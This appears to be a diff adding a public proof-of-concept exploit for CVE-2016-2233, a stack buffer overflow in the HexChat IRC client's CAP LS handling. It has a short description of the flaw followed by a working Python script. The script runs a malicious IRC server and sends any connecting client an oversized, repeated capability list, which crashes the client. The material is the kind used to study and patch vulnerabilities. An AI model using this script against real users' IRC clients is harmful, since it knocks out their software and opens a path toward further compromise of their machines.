@@ -1,0 +1,74 @@
+#!/usr/bin/python
+#
+####################
+# Meta information #
+####################
+# Exploit Title: Hexchat IRC client - CAP LS Handling Stack Buffer Overflow
+# Date: 2016-02-07
+# Exploit Author: PizzaHatHacker
+# Vendor Homepage: https://hexchat.github.io/index.html
+# Software Link: https://hexchat.github.io/downloads.html
+# Version: 2.11.0
+# Tested on: HexChat 2.11.0 & Linux (64 bits) + HexChat 2.10.2 & Windows 8.1 (64 bits)
+# CVE : CVE-2016-2233
+
+#############################
+# Vulnerability description #
+#############################
+'''
+Stack Buffer Overflow in src/common/inbound.c :
+void inbound_cap_ls (server *serv, char *nick, char *extensions_str, const message_tags_data *tags_data)
+
+In this function, Hexchat IRC client receives the available extensions from 
+the IRC server (CAP LS message) and constructs the request string to indicate
+later which one to use (CAP REQ message).
+This request string is stored in the fixed size (256 bytes) byte array
+'buffer'. It has enough space for all possible options combined, BUT
+it will overflow if some options are repeated.
+
+CVSS v2 Vector (AV:N/AC:L/Au:N/C:P/I:P/A:P)
+CVSS Base Score : 7.5
+Impact Subscore : 6.4
+Exploitability Subscore : 10
+'''
+
+####################
+# Proof of Concept #
+####################
+'''
+* Install Hexchat IRC Client
+* Run this Python script on a (server) machine
+* Connect to the server running the script
+* Results : Hexchat will crash (most probably access violation/segmentation fault)
+'''
+
+import socket
+import sys
+import time
+
+# Exploit configuration
+HOST = ''
+PORT = 6667
+SERVERNAME = 'irc.example.com'
+OPTIONS = 'multi-prefix ' * 100 # 13*100 = 1300 bytes > 256 bytes
+
+# Create server socket
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+try:
+	sock.bind((HOST, PORT)) # Bind to port
+	sock.listen(0) # Start listening on socket
+	
+	print 'Server listening, waiting for connection...'
+	conn, addr = sock.accept()
+	
+	print 'Connected with ' + addr[0] + ':' + str(addr[1]) + ', sending packets...'
+	conn.send(':' + SERVERNAME + ' CAP * LS :' + OPTIONS + '\r\n')
+	
+	# Wait and close socket
+	conn.recv(256)
+	sock.close()
+	
+	print 'Done.'
+
+except socket.error as msg:
+	print 'Network error : ' + str(msg[0]) + ' ' + msg[1]
